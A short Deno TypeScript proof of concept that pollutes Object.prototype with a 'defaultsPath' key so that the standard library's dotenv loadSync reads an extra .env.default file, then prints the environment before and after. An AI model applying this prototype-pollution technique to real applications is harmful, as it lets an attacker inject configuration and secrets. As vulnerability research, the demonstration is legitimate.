import { loadSync } from "https://deno.land/std@0.216.0/dotenv/mod.ts";

function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

const unpolluted = loadSync();
console.log(unpolluted);

pollute("defaultsPath", "./.env.default");

const polluted = loadSync();
console.log(polluted);
